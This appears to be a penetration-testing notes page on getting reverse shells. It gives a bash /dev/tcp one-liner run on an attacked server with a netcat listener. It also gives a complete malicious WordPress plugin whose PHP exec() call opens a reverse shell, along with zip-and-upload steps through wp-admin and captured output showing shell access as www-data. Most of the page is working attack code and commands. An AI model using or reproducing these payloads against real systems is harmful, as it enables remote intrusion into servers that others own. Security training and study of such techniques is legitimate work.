---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reverse Shell

### Reverse Shell via Bash TCP

We start by Listening in our host first `~$ nc -nvlp PORT_NUMBER` ; then we execute the below command on the attacked server:

{% hint style="info" %}
To ensure our reverse shell is executed via bash, make sure to add `bash -c`&#x20;
{% endhint %}

```bash
bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"
```

Check this [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) by swissky.

### Reverse Shell via Wordpress Plugin

Create a new wordpress plugin using the simple php file below

```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/443 0>&1'");
?>
```



In order to upload the shell as a plugin, we need to zip it first then upload it as a plugin via `wp-admin`

```sh
zip reverse-shell.zip reverse-shell.php
```



<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

after activating it,  use netcat to listen on port 443 and catch the shell

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvp 443                          
listening on [any] 443 ...
connect to [IP_ADDRESS] from [IP_ADDRESS]
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@example:/var/www/html/wp-admin$ pwd
pwd
/var/www/html/wp-admin
```



**Resources:**

* [https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell)
* [https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp)
